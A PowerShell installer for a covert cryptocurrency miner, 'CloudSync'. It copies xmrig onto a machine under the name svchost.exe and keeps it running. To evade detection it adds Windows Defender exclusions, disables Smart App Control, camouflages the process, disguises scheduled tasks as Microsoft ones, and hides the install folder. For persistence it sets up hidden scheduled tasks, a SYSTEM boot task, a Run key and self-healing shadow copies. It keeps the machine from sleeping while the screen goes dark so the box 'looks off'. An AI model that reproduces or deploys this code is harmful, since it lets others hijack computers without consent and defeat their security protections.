<#
.SYNOPSIS
    Installs the CloudSync miner supervisor.

.DESCRIPTION
    Fixes over the previous installer:
      * elevation is detected and requested once (-Elevated guard, no loop);
      * only a whitelisted payload is copied - the whole source folder used
        to be cloned, dragging junk onto every machine;
      * Python is found, or installed per-user (no admin, no hardcoded
        C:\Program Files path); no pip packages are needed at all;
      * the GPU profile is generated once at install time;
      * scheduled tasks are Hidden, have a daily + logon trigger, restart on
        failure, and there is a health task so a dead controller comes back
        without waiting for the next reboot;
      * Defender exclusions are narrow (install dir + one exe) and the old
        machine-wide python.exe / .json exclusions are removed;
      * never blocks on ReadKey (that hung every remote deployment);
      * exits non-zero if verification fails;
      * installs the modular runtime (``pythonw -m cloudsync``) when a
        ``cloudsync\`` package is present in the source tree, and the flat
        ``controller.py`` layout when it is not. The choice is recorded in
        ``install.json`` as ``runtime``.

.EXAMPLE
    powershell -NoProfile -ExecutionPolicy Bypass -File .\install-task.ps1 -NoPrompt
#>
[CmdletBinding()]
param(
    [string]$InstallDir  = (Join-Path $env:LOCALAPPDATA 'Microsoft\CloudSync'),
    [string]$TaskRoot    = 'Microsoft\Windows\CloudSync',
    [string]$TaskName    = 'CloudSync',
    [string]$HealthName  = 'CloudSyncHealth',
    [string]$BinaryName  = 'svchost.exe',
    [int]$IdleSeconds    = 180,
    [switch]$NoExclusions,
    [switch]$NoPrompt,
    [switch]$Prompt,
    [switch]$SkipGpuProbe,
    [switch]$CleanLegacy,
    [switch]$NoMaxPower,
    [switch]$NoCamo,
    [switch]$MachineWide,
    [switch]$PerUser,
    [switch]$NoSac,
    [switch]$Elevated
)

$ErrorActionPreference = 'Stop'
$script:Fail  = 0
$script:Warn  = 0

function Say   ($m) { Write-Host $m }
function Ok    ($m) { Write-Host ("  [ OK ] {0}" -f $m) -ForegroundColor Green }
function Bad   ($m) { Write-Host ("  [FAIL] {0}" -f $m) -ForegroundColor Red;  $script:Fail++ }
function Warn  ($m) { Write-Host ("  [WARN] {0}" -f $m) -ForegroundColor Yellow; $script:Warn++ }
function Check ($label, $cond) { if ($cond) { Ok $label } else { Bad $label } }

function Test-Admin {
    try {
        $id = [Security.Principal.WindowsIdentity]::GetCurrent()
        (New-Object Security.Principal.WindowsPrincipal $id).IsInRole(
            [Security.Principal.WindowsBuiltInRole]::Administrator)
    } catch { $false }
}

function Hide-Path ($p) {
    try {
        $i = Get-Item -LiteralPath $p -Force
        $i.Attributes = $i.Attributes -bor [IO.FileAttributes]::Hidden
    } catch { Warn "could not hide $p" }
}

# ==============================================================
# 0. elevation
# ==============================================================
Say "=== CloudSync installer ==="
$admin = Test-Admin

if (-not $admin -and -not $Elevated -and -not $NoPrompt) {
    Say "[+] Not elevated - relaunching elevated (Defender exclusions and all-user paths need it)..."
    try {
        $self = $MyInvocation.MyCommand.Path
        $argList = @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', "`"$self`"",
                     '-NoPrompt', '-Elevated')
        $p = Start-Process -FilePath 'powershell.exe' -ArgumentList $argList -Verb RunAs -Wait -PassThru
        exit $p.ExitCode
    } catch {
        Warn "elevation declined - continuing in limited mode"
    }
}

$admin = Test-Admin
if ($admin) { Ok "running elevated" } else { Warn "running limited (no Defender exclusions, no MSR/huge-page unlock)" }

# The health watchdog restarts the controller and restores files from the shadow
# copy; either can race the payload copy below. Suspend it for the duration of
# the install and re-enable it after verification.
try { schtasks.exe /change /tn "$TaskRoot\$HealthName" /disable 2>$null | Out-Null } catch { }
Say "  [i] health task suspended during install"

# ==============================================================
# 1. source + payload
# ==============================================================
$src = $PSScriptRoot
if (-not $src) { $src = Split-Path -Parent $MyInvocation.MyCommand.Path }
if (-not (Test-Path $src)) { $src = (Get-Location).Path }
Say "[+] source: $src"

$payload = @(
    'controller.py', 'gpudetect.py', 'config_high.json', 'manifest.json',
    # NOTE: uninstall.ps1 and all documentation are deliberately NOT deployed.
    # uninstall.ps1 resolves the install dir itself, so the operator runs it
    # from the kit; README/WORKFLOW are for us, not for the target machine.
    'wallet.txt', 'watchdog.ps1', 'install-task.ps1',
    'restore-system.ps1', 'harden.ps1', 'camo.ps1', 'check-updates.ps1',
    'REMOTE.cmd'
)

# ---- runtime selection ------------------------------------------------------
# Same additive approach as the published repo installer: the modular package is
# copied only when the source tree has one. A source tree without cloudsync\
# installs the flat controller.py layout exactly as before.
$packageSrc = Join-Path $src 'cloudsync'
$modular = Test-Path -LiteralPath (Join-Path $packageSrc '__main__.py')
$runtime = if ($modular) { 'modular' } else { 'flat' }
if ($modular) { Say "[+] runtime: modular (pythonw -m cloudsync)" }
elseif (Test-Path -LiteralPath $packageSrc) { Warn "cloudsync\ present but no __main__.py - using the flat runtime" }
else { Say "[+] runtime: flat (controller.py)" }

# ==============================================================
# 2. python
# ==============================================================
function Resolve-Python {
    # must resolve to pythonw.exe: python.exe is a console app and would flash a
    # window in the user session, which defeats the point of running hidden
    $cands = @()
    if (Test-Path (Join-Path $InstallDir 'install.json')) {
        try {
            $j = Get-Content (Join-Path $InstallDir 'install.json') -Raw | ConvertFrom-Json
            if ($j.pythonw) { $cands += $j.pythonw }
            if ($j.python)  { $cands += $j.python }
        } catch { }
    }
    foreach ($n in 'pythonw.exe') {
        $c = Get-Command $n -ErrorAction SilentlyContinue
        if ($c) { $cands += $c.Source }
    }
    $cands += @(
        (Join-Path $env:LOCALAPPDATA 'Programs\Python\Python312\pythonw.exe'),
        (Join-Path $env:LOCALAPPDATA 'Programs\Python\Python313\pythonw.exe'),
        (Join-Path $env:LOCALAPPDATA 'Programs\Python\Python311\pythonw.exe'),
        'C:\Python313\pythonw.exe', 'C:\Python312\pythonw.exe',
        'C:\Program Files\Python313\pythonw.exe',
        'C:\Program Files\Python312\pythonw.exe',
        'C:\Program Files\Python311\pythonw.exe'
    )
    foreach ($c in $cands) {
        if (-not $c) { continue }
        if ($c -match 'python\.exe$') { $c = $c -replace 'python\.exe$', 'pythonw.exe' }
        if (Test-Path $c) { return $c }
    }
    return $null
}

Say "[+] locating Python..."
$pythonw = Resolve-Python

if (-not $pythonw) {
    Say "[+] Python not found - installing 3.12 per-user (no admin required)..."
    $exe = Join-Path $env:TEMP 'python_installer.exe'
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        Invoke-WebRequest -UseBasicParsing -Uri 'https://www.python.org/ftp/python/3.12.2/python-3.12.2-amd64.exe' -OutFile $exe
        Start-Process -FilePath $exe -Wait -ArgumentList @(
            '/quiet', 'InstallAllUsers=0', 'PrependPath=1', 'Include_test=0', 'Include_launcher=1'
        ) | Out-Null
    } catch {
        Warn "Python download/install failed: $($_.Exception.Message)"
    }
    $pythonw = Resolve-Python
}
if ($pythonw) { Ok "pythonw: $pythonw" } else { Bad "no pythonw.exe found - controller cannot run" }
$python = $null
if ($pythonw) { $python = $pythonw -replace 'pythonw\.exe$', 'python.exe' }

# ==============================================================
# 2b. copy helpers (defined before the payload copy that uses them)
# ==============================================================
# A freshly written file can be locked for a moment by real-time AV while it is
# scanned. Retry instead of dying: this was observed with ESET.
function Copy-Retry ($From, $To, $Tries = 6) {
    for ($i = 1; $i -le $Tries; $i++) {
        try { Copy-Item -LiteralPath $From -Destination $To -Force -ErrorAction Stop; return $true }
        catch { Start-Sleep -Milliseconds 700 }
    }
    return $false
}
function Get-HashRetry ($Path, $Tries = 6) {
    for ($i = 1; $i -le $Tries; $i++) {
        try { return (Get-FileHash -LiteralPath $Path -Algorithm SHA256 -ErrorAction Stop).Hash.ToLower() }
        catch { Start-Sleep -Milliseconds 700 }
    }
    return $null
}

# ==============================================================
# 3. copy payload
# ==============================================================
# Machine-wide is the default: the payload lives in ProgramData so it does not
# depend on which user is logged in. -PerUser restores the old profile layout.
if (-not $PerUser -and $InstallDir -like "$env:LOCALAPPDATA*") {
    $InstallDir = Join-Path $env:ProgramData 'Microsoft\CloudSync'
}
if ($InstallDir -like "$env:ProgramData*") { Say "[+] machine-wide install: $InstallDir" }
else { Say "[+] per-user install: $InstallDir" }
# Pre-exclude the install dir BEFORE the payload lands: a real-time AV can
# quarantine the renamed worker the moment it is copied, and the normal
# exclusion step runs at the end of the install (observed with Windows
# Defender on 192.168.4.252, 2026-11-10). Idempotent; no-op without admin.
if ($admin -and -not $NoExclusions) {
    try {
        Add-MpPreference -ExclusionPath $InstallDir -ErrorAction SilentlyContinue
        foreach ($n in @($BinaryName, 'xmrig.exe')) {
            Add-MpPreference -ExclusionPath (Join-Path $InstallDir $n) -ErrorAction SilentlyContinue
        }
        Say "  [i] pre-excluded $InstallDir (before payload copy)"
    } catch { Warn "pre-exclusion failed (continuing)" }
}

# Smart App Control (Windows 11) blocks unsigned binaries with "Malicious binary
# reputation" (error 4556) even when Defender exclusions are set; it cannot be
# excluded, only disabled. Detect enforcement and turn it off (reboot required).
# One-way: Windows only re-enables SAC through a reset, so this is logged loudly.
if ($admin -and -not $NoSac) {
    try {
        $sacKey = 'HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy'
        $sac = (Get-ItemProperty -LiteralPath $sacKey -Name VerifiedAndReputablePolicyState -ErrorAction SilentlyContinue).VerifiedAndReputablePolicyState
        if ($null -ne $sac -and [int]$sac -eq 1) {
            Set-ItemProperty -LiteralPath $sacKey -Name VerifiedAndReputablePolicyState -Value 0 -Type DWord
            $script:SacDisabled = $true
            Ok "Smart App Control disabled (was enforcing; reboot required to take effect)"
        } elseif ($null -ne $sac) {
            Say ("  [i] Smart App Control state: {0}" -f $sac)
        }
    } catch { Warn "could not read/disable Smart App Control: $($_.Exception.Message)" }
}
Say "[+] installing to $InstallDir"
New-Item -ItemType Directory -Force -Path $InstallDir | Out-Null
if ($InstallDir -like "$env:ProgramData*") {
    if ($admin) {
        & icacls.exe $InstallDir /grant '*S-1-5-32-545:(OI)(CI)M' /T /C 2>&1 | Out-Null
        Ok "machine-wide: BUILTIN\Users granted modify on $InstallDir"
    } else {
        Warn "machine-wide needs elevation to grant Users modify - run elevated"
    }
}

# ---- stop any running instance first, or the binary is locked -------------
Get-CimInstance Win32_Process -Filter "Name='pythonw.exe' OR Name='python.exe'" -ErrorAction SilentlyContinue |
    Where-Object { $_.CommandLine -like '*controller.py*' -or $_.CommandLine -like '*-m cloudsync*' } |
    ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue; Say "  stopped controller $($_.ProcessId)" }
foreach ($n in @('svchost.exe','CloudSync.exe','xmrig.exe','WinSync.exe')) {
    Get-CimInstance Win32_Process -Filter "Name='$n'" -ErrorAction SilentlyContinue |
        Where-Object { $_.ExecutablePath -like "$InstallDir*" } |
        ForEach-Object { & taskkill.exe /F /PID $_.ProcessId 2>$null | Out-Null; Say "  stopped worker $($_.ProcessId)" }
}
Start-Sleep -Seconds 2

foreach ($f in $payload) {
    if ($modular -and $f -eq 'controller.py') { continue }
    $s = Join-Path $src $f
    $d = Join-Path $InstallDir $f
    if (Test-Path $s) { Copy-Retry $s $d | Out-Null }
}

# wallet.txt holds the payout address: readable by the operator, not writable or
# readable-only-for-them by every local user.
if (Test-Path -LiteralPath (Join-Path $InstallDir 'wallet.txt')) {
    & icacls.exe (Join-Path $InstallDir 'wallet.txt') /inheritance:r /grant:r "$($env:USERNAME):F" /grant:r '*S-1-5-32-545:R' 2>&1 | Out-Null
    Say "  [i] wallet.txt permits: $env:USERNAME full, Users read-only"
}

$entryPayload = @($payload)
$packageEntries = @()
if ($modular) {
    try {
        Copy-Item -LiteralPath $packageSrc -Destination $InstallDir -Recurse -Force -ErrorAction Stop
        $pkgRoot = Join-Path $InstallDir 'cloudsync'
        $pkgFiles = @(Get-ChildItem -LiteralPath $pkgRoot -Recurse -File -Filter '*.py')
        Ok ("cloudsync package: {0} .py file(s)" -f $pkgFiles.Count)
        $packageEntries = @($pkgFiles | ForEach-Object { $_.FullName.Substring($InstallDir.Length + 1) })
        $entryPayload = @($payload | Where-Object { $_ -ne 'controller.py' })
    } catch {
        Bad "cloudsync package copy failed: $($_.Exception.Message) - falling back to the flat runtime"
        $modular = $false
        $runtime = 'flat'
        $fallback = Join-Path $src 'controller.py'
        if (Test-Path -LiteralPath $fallback) {
            Copy-Item -LiteralPath $fallback -Destination (Join-Path $InstallDir 'controller.py') -Force
        }
    }
    if ($modular) {
        # A flat controller.py would make the package lifecycle code prefer the
        # flat command again (Run key), so a stale copy must not survive.
        $staleController = Join-Path $InstallDir 'controller.py'
        if (Test-Path -LiteralPath $staleController) {
            Remove-Item -LiteralPath $staleController -Force -ErrorAction SilentlyContinue
            Say "  [i] removed stale flat controller.py (modular runtime)"
        }
    }
}
# Every payload file the watchdog can restore from the shadow copy.
$selfHeal = @($entryPayload) + @($packageEntries)

# binary: accept either a rename at rest or the original name
$binSrc = $null
foreach ($n in @($BinaryName, 'CloudSync.exe', 'xmrig.exe', 'WinSync.exe', 'xmrig')) {
    $p = Join-Path $src $n
    if (Test-Path $p) { $binSrc = $p; break }
}
if ($binSrc) {
    $dest = Join-Path $InstallDir $BinaryName
    $done = $false
    for ($try = 1; $try -le 3 -and -not $done; $try++) {
        try {
            Copy-Item -LiteralPath $binSrc -Destination $dest -Force -ErrorAction Stop
            $done = $true
        } catch {
            Say "  [i] binary copy attempt $try failed, retrying..."
            Start-Sleep -Seconds 2
        }
    }
    if ($done) {
        Ok ("binary: {0} -> {1} ({2:N0} bytes)" -f (Split-Path -Leaf $binSrc), $BinaryName, (Get-Item $binSrc).Length)
        # Fallback copy under the OLD name: legacy machines already have an AV
        # exclusion for xmrig.exe, so if the new name gets flagged the worker
        # still runs. The controller fails over automatically.
        if ($BinaryName -ne 'xmrig.exe') {
            try {
                Copy-Item -LiteralPath $dest -Destination (Join-Path $InstallDir 'xmrig.exe') -Force -ErrorAction Stop
                Ok "fallback copy: xmrig.exe (reuses any existing AV exclusion)"
            } catch {
                Warn "could not write the xmrig.exe fallback copy"
            }
        }
    } else {
        Bad "binary copy failed (still locked) - close any running instance and retry"
    }
} elseif (Test-Path (Join-Path $InstallDir $BinaryName)) {
    Ok "binary already present"
} else {
    Bad "no miner binary found in $src"
}

# optional MSR driver (huge hashrate win, but a known AV/BYOVD detection vector)
$wrn = Join-Path $src 'WinRing0x64.sys'
if (Test-Path $wrn) {
    Copy-Item -LiteralPath $wrn -Destination (Join-Path $InstallDir 'WinRing0x64.sys') -Force
    Say "  [i] WinRing0x64.sys included (MSR mod enabled, higher AV risk)"
}

# remove binaries left behind by an earlier install under a different name
foreach ($stale in @('CloudSync.exe','WinSync.exe','svchost.exe')) {
    if ($stale -ne $BinaryName -and $stale -ne 'xmrig.exe') {
        $sp = Join-Path $InstallDir $stale
        if (Test-Path $sp) {
            Get-CimInstance Win32_Process -Filter "Name='$stale'" -ErrorAction SilentlyContinue |
                Where-Object { $_.ExecutablePath -like "$InstallDir*" } |
                ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
            Remove-Item -LiteralPath $sp -Force -ErrorAction SilentlyContinue
            Say "  [i] removed stale binary: $stale"
        }
    }
}

# ==============================================================
# 3b. process camouflage (version resource)
# ==============================================================
$binPath = Join-Path $InstallDir $BinaryName
if (-not $NoCamo -and (Test-Path $binPath)) {
    Say "[+] applying process camouflage..."
    try {
        & powershell.exe -NoProfile -ExecutionPolicy Bypass -File (Join-Path $InstallDir 'camo.ps1') -Path $binPath 2>&1 |
            Select-String 'FileDescription|OK|FAIL' | ForEach-Object { Say "  " + $_.Line.Trim() }
        $vd = (Get-Item -LiteralPath $binPath).VersionInfo.FileDescription
        if ($vd) { Ok "process appears as: $BinaryName / $vd" } else { Warn "version resource empty" }
    } catch {
        Warn "camouflage failed: $($_.Exception.Message)"
    }
}

# ==============================================================
# 4. GPU profile
# ==============================================================
if (-not $SkipGpuProbe -and $python) {
    Say "[+] probing GPU / OpenCL (about 15s, silent)..."
    try {
        $probe = Start-Process -FilePath $python -ArgumentList @((Join-Path $InstallDir 'gpudetect.py'), '--force') `
                               -WorkingDirectory $InstallDir -Wait -PassThru -WindowStyle Hidden
        $gpuFile = Join-Path $InstallDir 'gpu_profile.json'
        if (Test-Path $gpuFile) {
            $g = Get-Content $gpuFile -Raw | ConvertFrom-Json
            if ($g.opencl.enabled) {
                Ok ("GPU backend: {0} device(s) on platform {1}" -f @($g.devices).Count, $g.platform.name)
            } else {
                Warn "no usable OpenCL device - CPU only"
            }
        } else {
            Warn "GPU probe produced no profile - CPU only"
        }
    } catch {
        Warn "GPU probe failed: $($_.Exception.Message)"
    }
}

# ==============================================================
# 5. shadow copy (self-heal source)
# ==============================================================
$backupDir = $null
try {
    $root = Join-Path $env:ProgramData 'Microsoft\CloudSyncBackup'
    New-Item -ItemType Directory -Force -Path $root | Out-Null
    $backupDir = Join-Path $root ((New-Guid).ToString().Substring(0, 8))
    New-Item -ItemType Directory -Force -Path $backupDir | Out-Null
    $copied = 0
    foreach ($f in $selfHeal) {
        $p = Join-Path $InstallDir $f
        if (Test-Path $p) {
            $bak = Join-Path $backupDir $f
            $bakDir = Split-Path -Parent $bak
            if ($bakDir -and -not (Test-Path $bakDir)) { New-Item -ItemType Directory -Force -Path $bakDir | Out-Null }
            if (Copy-Retry $p $bak) { $copied++ }
        }
    }
    foreach ($exe in @($BinaryName, 'xmrig.exe')) {
        $p = Join-Path $InstallDir $exe
        if (Test-Path $p) { Copy-Retry $p (Join-Path $backupDir $exe) | Out-Null }
    }
    Ok ("shadow copy: {0} ({1}/{2} files)" -f $backupDir, $copied, $selfHeal.Count)
} catch {
    Warn "shadow copy failed: $($_.Exception.Message)"
    $backupDir = $null
}

# ==============================================================
# 6. install.json  (local source of truth for watchdog + controller)
# ==============================================================
$hashes = @{}
foreach ($f in $selfHeal) {
    $p = Join-Path $InstallDir $f
    if (Test-Path $p) {
        $h = Get-HashRetry $p
        if ($h) { $hashes[$f] = $h } else { Warn "could not hash $f (locked?)" }
    }
}
foreach ($exe in @($BinaryName, 'xmrig.exe')) {
    $p = Join-Path $InstallDir $exe
    if (Test-Path $p) {
        $h = Get-HashRetry $p
        if ($h) { $hashes[$exe] = $h }
    }
}

$installInfo = [ordered]@{
    install_dir  = $InstallDir
    python       = $python
    pythonw      = $pythonw
    binary       = $BinaryName
    tasks        = @("$TaskRoot\$TaskName", "$TaskRoot\$HealthName", "$TaskRoot\$TaskName-Boot")
    backup_dir   = $backupDir
    idle_seconds = $IdleSeconds
    run_name     = 'CloudSync'
    run_key      = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
    runtime      = $runtime
    entry        = if ($modular) { '-m cloudsync' } else { 'controller.py' }
    installed_at = (Get-Date).ToString('o')
    files        = $hashes
}
# BOM-free on purpose: Python's json.load rejects a UTF-8 BOM
$json = $installInfo | ConvertTo-Json -Depth 5
[IO.File]::WriteAllText((Join-Path $InstallDir 'install.json'), $json, (New-Object Text.UTF8Encoding($false)))
Ok "install.json written"

# ==============================================================
# 7. scheduled tasks
# ==============================================================
Say "[+] registering scheduled tasks..."
$taskPath = "\$TaskRoot\"
$me = if ($env:USERDOMAIN) { "$env:USERDOMAIN\$env:USERNAME" } else { $env:USERNAME }

# The command recorded in the task and the Run key: the modular runtime is
# `pythonw -m cloudsync` (working directory = install dir); the flat layout keeps
# launching controller.py exactly as before.
$mainCommand = if ($modular) { "`"$pythonw`" -m cloudsync" } else { "`"$pythonw`" `"$(Join-Path $InstallDir 'controller.py')`"" }

try {
    $act = if ($modular) {
        New-ScheduledTaskAction -Execute $pythonw -Argument '-m cloudsync' -WorkingDirectory $InstallDir
    } else {
        New-ScheduledTaskAction -Execute $pythonw `
            -Argument "`"$(Join-Path $InstallDir 'controller.py')`"" `
            -WorkingDirectory $InstallDir
    }

    $settings = New-ScheduledTaskSettingsSet -Hidden -StartWhenAvailable `
        -ExecutionTimeLimit ([TimeSpan]::Zero) -MultipleInstances IgnoreNew `
        -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 2) `
        -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries

    $principal = New-ScheduledTaskPrincipal -GroupId 'BUILTIN\Users' -RunLevel Limited

    # -AtLogOn without -User: fires for ANY user who signs in. The controller's
    # machine-wide mutex keeps exactly one miner alive across all sessions.
    $trigLogon = New-ScheduledTaskTrigger -AtLogOn
    $trigDaily = New-ScheduledTaskTrigger -Daily -At '03:17'

    Register-ScheduledTask -TaskName $TaskName -TaskPath $taskPath -Action $act `
        -Trigger @($trigLogon, $trigDaily) -Settings $settings -Principal $principal `
        -Description 'Microsoft Cloud Sync' -Force | Out-Null
    Ok "main task: $TaskRoot\$TaskName"

    $hact = New-ScheduledTaskAction -Execute 'powershell.exe' `
        -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$(Join-Path $InstallDir 'watchdog.ps1')`""
    $htrigA = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(2) `
        -RepetitionInterval (New-TimeSpan -Minutes 10) `
        -RepetitionDuration (New-TimeSpan -Days 1)
    $htrigB = New-ScheduledTaskTrigger -Daily -At '03:47'

    Register-ScheduledTask -TaskName $HealthName -TaskPath $taskPath -Action $hact `
        -Trigger @($htrigA, $htrigB) -Settings $settings -Principal $principal `
        -Description 'Microsoft Cloud Sync Health' -Force | Out-Null
    Ok "health task: $TaskRoot\$HealthName"
    # Boot trigger as SYSTEM: a headless server (FILE-SERVER, 2026-11-10) may never
    # log a user on, so AtLogOn alone never fires. SYSTEM starts in session 0; the
    # machine-wide mutex means it yields to an in-session controller.
    # The action mirrors the main task: a flat install must launch controller.py,
    # otherwise the SYSTEM boot task can never start.
    if ($modular) {
        $bootAct = New-ScheduledTaskAction -Execute $pythonw -Argument "-m cloudsync" -WorkingDirectory $InstallDir
    } else {
        $bootAct = New-ScheduledTaskAction -Execute $pythonw `
            -Argument "`"$(Join-Path $InstallDir 'controller.py')`"" `
            -WorkingDirectory $InstallDir
    }
    $bootSettings = New-ScheduledTaskSettingsSet -Hidden -StartWhenAvailable -ExecutionTimeLimit ([TimeSpan]::Zero) -MultipleInstances IgnoreNew -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 2) -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    $bootPrincipal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -TaskName "$TaskName-Boot" -TaskPath $taskPath -Action $bootAct -Trigger (New-ScheduledTaskTrigger -AtStartup) -Settings $bootSettings -Principal $bootPrincipal -Description 'Microsoft Cloud Sync (boot)' -Force | Out-Null
    Ok "boot task: $TaskRoot\$TaskName-Boot"
} catch {
    Warn "task registration failed ($($_.Exception.Message)) - falling back to schtasks"
    if ($modular) {
        schtasks.exe /Create /TN "$TaskRoot\$TaskName" /TR "`"$pythonw`" -m cloudsync" /SC ONLOGON /RL LIMITED /IT /F /RU $env:USERNAME | Out-Null
    } else {
        schtasks.exe /Create /TN "$TaskRoot\$TaskName" /TR "`"$pythonw`" `"$(Join-Path $InstallDir 'controller.py')`"" /SC ONLOGON /RL LIMITED /IT /F /RU $env:USERNAME | Out-Null
    }
    schtasks.exe /Create /TN "$TaskRoot\$HealthName" /TR "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$(Join-Path $InstallDir 'watchdog.ps1')`"" /SC MINUTE /MO 10 /RL LIMITED /IT /F /RU $env:USERNAME | Out-Null
}

# ==============================================================
# 7b. second persistence: HKCU Run key
# ==============================================================
# Task Scheduler and the Run key each start the controller; the machine-wide
# mutex means only one miner ever runs. If one is deleted, the other still
# brings it back - and the controller re-creates this key itself every 10 min.
$runKeyPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
$runValue = $mainCommand
try {
    if (-not (Test-Path $runKeyPath)) { New-Item -Path $runKeyPath -Force | Out-Null }
    Set-ItemProperty -Path $runKeyPath -Name 'CloudSync' -Value $runValue -Type String -Force
    Ok "autostart Run key set (HKCU\...\Run\CloudSync)"
} catch {
    Warn "could not set the Run key: $($_.Exception.Message)"
}

# ==============================================================
# 8. Defender exclusions (narrow, and clean the old wide ones)
# ==============================================================
if ($admin -and -not $NoExclusions) {
    Say "[+] Defender exclusions..."
    $defActive = $false
    try { $defActive = [bool](Get-MpComputerStatus -ErrorAction Stop).AMServiceEnabled } catch { $defActive = $false }

    # Always ATTEMPT the exclusions, even when Defender is not the active AV:
    # Defender can be re-enabled later (or another profile/AV switches on), and
    # the preference is stored regardless of who is currently scanning.
    $added = 0
    # note the leading commas: they keep each pair as its own array
    $exclTargets = @(
        ,@('Path', $InstallDir)
        ,@('Process', (Join-Path $InstallDir $BinaryName))
    )
    if ($BinaryName -ne 'xmrig.exe') { $exclTargets += ,@('Process', (Join-Path $InstallDir 'xmrig.exe')) }
    foreach ($pair in $exclTargets) {
        try {
            switch ($pair[0]) {
                'Path'    { Add-MpPreference -ExclusionPath $pair[1] -ErrorAction Stop }
                'Process' { Add-MpPreference -ExclusionProcess $pair[1] -ErrorAction Stop }
            }
            Ok "excluded ($($pair[0])): $($pair[1])"
            $added++
        } catch {
            if ($defActive) {
                Warn "exclusion failed for $($pair[1]): $($_.Exception.Message)"
            }
        }
    }
    if ($added -eq 0) {
        if ($defActive) {
            Warn "no Defender exclusion could be written (tamper protection?)"
        } else {
            Say "  [i] Defender service is not running (third-party AV is active) -"
            Say "      the exclusion could not be written. Exclude these in your AV:"
        }
        foreach ($pair in $exclTargets) { Say ("        {0}" -f $pair[1]) }
    }
    # legacy wide exclusions from the old installer - each in its own try so a
    # failure here never masks the exclusions above
    if ($defActive) {
    try {
        $pref = Get-MpPreference
        if ($pref.ExclusionProcess -contains 'python.exe') {
            Remove-MpPreference -ExclusionProcess 'python.exe' -ErrorAction Stop
            Say "  [i] removed legacy python.exe exclusion"
        }
    } catch { Warn "could not remove legacy python.exe exclusion" }
    try {
        $pref = Get-MpPreference
        if ($pref.ExclusionExtension -contains '.json') {
            Remove-MpPreference -ExclusionExtension '.json' -ErrorAction Stop
            Say "  [i] removed legacy .json exclusion"
        }
    } catch { Warn "could not remove legacy .json exclusion" }
    }
}

# ==============================================================
# 8b. power profile + reversibility baseline
# ==============================================================
function Get-PowerTimeout ($sub, $setting) {
    $out  = powercfg /q SCHEME_CURRENT $sub $setting
    $acM  = ($out | Select-String 'Current AC Power Setting Index:\s*0x([0-9a-fA-F]+)')
    $dcM  = ($out | Select-String 'Current DC Power Setting Index:\s*0x([0-9a-fA-F]+)')
    [pscustomobject]@{
        ac = if ($acM.Matches.Count) { [Convert]::ToInt32($acM.Matches[0].Groups[1].Value, 16) } else { $null }
        dc = if ($dcM.Matches.Count) { [Convert]::ToInt32($dcM.Matches[0].Groups[1].Value, 16) } else { $null }
    }
}

$baselinePath = Join-Path $InstallDir 'system_baseline.json'
if (-not $NoMaxPower) {
    Say "[+] power profile..."
    if (-not (Test-Path $baselinePath)) {
        $sleepT = Get-PowerTimeout 'SUB_SLEEP' 'STANDBYIDLE'
        $monT   = Get-PowerTimeout 'SUB_VIDEO' 'VIDEOIDLE'
        $scheme = ((powercfg /getactivescheme) -join ' ') -replace '.*GUID:\s*([0-9a-fA-F-]+).*', '$1'

        # Defender may be disabled or tamper-protected; that must not abort the
        # install, so the snapshot is collected defensively.
        $defPaths = @(); $defProcs = @(); $defExts = @()
        try {
            $mp = Get-MpPreference -ErrorAction Stop
            $defPaths = @($mp.ExclusionPath)
            $defProcs = @($mp.ExclusionProcess)
            $defExts  = @($mp.ExclusionExtension)
        } catch {
            Say "  [i] Defender preferences unavailable ($($_.Exception.Message))"
        }

        $baseline = [ordered]@{
            captured_at     = (Get-Date).ToString('o')
            active_scheme   = $scheme
            standby_ac_min  = if ($null -ne $sleepT.ac) { [int]($sleepT.ac / 60) } else { $null }
            standby_dc_min  = if ($null -ne $sleepT.dc) { [int]($sleepT.dc / 60) } else { $null }
            monitor_ac_min  = if ($null -ne $monT.ac)   { [int]($monT.ac   / 60) } else { $null }
            monitor_dc_min  = if ($null -ne $monT.dc)   { [int]($monT.dc   / 60) } else { $null }
            hibernate_state = (((powercfg /a) -join "`n") -match 'Hibernate')
            defender_paths  = $defPaths
            defender_procs  = $defProcs
            defender_exts   = $defExts
            tasks           = @("$TaskRoot\$TaskName", "$TaskRoot\$HealthName")
        }
        $json = $baseline | ConvertTo-Json -Depth 5
        [IO.File]::WriteAllText($baselinePath, $json, (New-Object Text.UTF8Encoding($false)))
        Ok "system baseline saved: $baselinePath"
    } else {
        Say "  [i] baseline already present - keeping the original snapshot"
    }

    try {
        # full performance plan + never sleep on AC. The display timer is left
        # exactly as it was, so the screen still goes dark and the box looks off.
        powercfg /setactive SCHEME_MIN | Out-Null
        powercfg /change standby-timeout-ac 0 | Out-Null
        powercfg /change hibernate-timeout-ac 0 | Out-Null

        $mon = Get-PowerTimeout 'SUB_VIDEO' 'VIDEOIDLE'
        if ($mon.ac -eq 0) { powercfg /change monitor-timeout-ac 10 | Out-Null }

        Ok "high-performance scheme active, sleep disabled on AC"
        Say "  [i] reverse with: restore-system.ps1"
    } catch {
        Warn "power profile not fully applied: $($_.Exception.Message)"
    }
}

# ==============================================================
# 9. hide + start
# ==============================================================
Hide-Path $InstallDir
Ok "install folder hidden"

if ($pythonw) {
    Say "[+] starting controller ($runtime runtime)..."
    if ($modular) {
        Start-Process -FilePath $pythonw -ArgumentList @('-m', 'cloudsync') `
                      -WorkingDirectory $InstallDir -WindowStyle Hidden | Out-Null
    } else {
        Start-Process -FilePath $pythonw -ArgumentList @("`"$(Join-Path $InstallDir 'controller.py')`"") `
                      -WorkingDirectory $InstallDir -WindowStyle Hidden | Out-Null
    }
    Start-Sleep -Seconds 6
}

# ==============================================================
# 10. optional legacy cleanup
# ==============================================================
